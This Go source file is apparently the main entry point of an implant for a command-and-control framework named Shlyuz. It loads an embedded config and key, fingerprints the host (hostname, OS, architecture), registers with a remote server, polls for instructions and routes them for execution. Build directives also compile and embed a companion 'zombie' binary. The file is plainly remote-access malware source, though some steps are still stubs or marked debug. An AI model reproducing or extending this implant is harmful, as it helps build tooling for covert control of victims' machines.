//go:build implant

package main

import (
	"embed"
	"log"
	"sync"
	"time"

	"shlyuz/pkg/component"
	"shlyuz/pkg/config"
	"shlyuz/pkg/config/vzhivlyatconfig"

	// "shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
	"shlyuz/pkg/transaction"
	"shlyuz/pkg/transport"
	"shlyuz/pkg/utils/logging"
	"shlyuz/pkg/utils/uname"
)

// embeded config
//
//go:generate cp -r ../../configs/shlyuz.conf ./shlyuz.conf
//go:generate cp -r ../../configs/symkey ./symkey
//go:generate go build -o zombie ../../internal/zombie/pkg/zombie.go
//go:embed *
var configFs embed.FS

type interactionCounter struct {
	mu sync.Mutex
	v  component.Component
	t  transport.TransportMethod
}

// Initalizes the implant, reads the config, sets the values, initalizes the keys, etc
func genComponentInfo() component.Component {
	var YadroComponent component.Component
	var err error
	log.SetPrefix(logging.GetLogPrefix())
	log.Println("Started Shlyuz")
	rawConfig, err := configFs.ReadFile("shlyuz.conf")
	if err != nil {
		log.Fatalln("failed to get embedded config")
	}
	symKey, err := configFs.ReadFile("symkey")
	if err != nil {
		log.Fatalln("failed to retrieve symkey")
	}
	// componentConfig := config.ReadConfig(rawConfig, YadroComponent.XorKey, symKey)
	componentConfig := config.ReadPlaintextConfig(rawConfig, symKey) // debug
	parsedConfig := vzhivlyatconfig.ParseConfig(componentConfig.Message)
	YadroComponent.Config.Id = parsedConfig.Id
	YadroComponent.ComponentId = YadroComponent.Config.Id
	YadroComponent.Config.TransportName = parsedConfig.TransportName
	YadroComponent.Config.InitSignature = parsedConfig.InitSignature
	YadroComponent.Config.TskChkTimer = parsedConfig.TskChkTimer
	YadroComponent.Config.CryptoConfig = parsedConfig.CryptoConfig
	YadroComponent.InitalKeypair = YadroComponent.Config.CryptoConfig.CompKeyPair
	YadroComponent.InitalRemotePubkey = parsedConfig.CryptoConfig.PeerPk
	YadroComponent.ConfigKey = componentConfig.Key
	YadroComponent.Manifest = makeManifest(YadroComponent.Config.Id)

	return YadroComponent
}

func makeManifest(componentId string) component.ComponentManifest {
	var generatedManifest component.ComponentManifest
	platInfo := uname.GetUname()
	generatedManifest.Hostname = platInfo.Uname.Nodename
	generatedManifest.Id = componentId
	generatedManifest.Os = platInfo.Uname.Sysname
	generatedManifest.Arch = platInfo.Uname.Machine
	return generatedManifest
}

func registerServer(Component component.Component) transport.RegisteredComponent {
	var serverReg transport.RegisteredComponent
	transport, _, err := transport.PrepareTransport(&Component, []string{})
	if err != nil {
		log.Fatalln("transport failed to initalize: ", err)
	}
	initFrame := transaction.GenerateInitFrame(Component)
	transaction.RelayInitFrame(&Component, initFrame, transport)
	serverReg, boolSuccess := transaction.RetrieveInitFrame(&Component, transport)
	if !boolSuccess {
		log.Fatalln("server registration failed")
	}
	log.Println(serverReg) //debug
	return serverReg
}

func run(server *transport.RegisteredComponent) {
	for {
		var instructionRequestFrame instructions.InstructionFrame
		// var newKeyPair asymmetric.AsymmetricKeyPair
		instructionRequestFrame = transaction.GenerateRequestInstruction(server)
		transaction.RelayInstructionFrame(server, instructionRequestFrame)
		// server.CurKeyPair = newKeyPair
		instructionFrame, err := transaction.RetrieveInstruction(server)
		log.Println(instructionFrame) // debug
		if err != nil {
			log.Println("invalid instruction received: ")
			log.Println(err)
			time.Sleep(time.Duration(server.TskChkTimer))
			break
		}
		// TODO: Process instruction
		transaction.RouteInstruction(server, instructionFrame)
		time.Sleep(time.Duration(server.TskChkTimer))
		break
	}

}

func main() {
	Component := genComponentInfo()
	// transportWg := sync.WaitGroup{}
	// defer transportWg.Wait()
	serverReg := registerServer(Component)
	run(&serverReg)
}
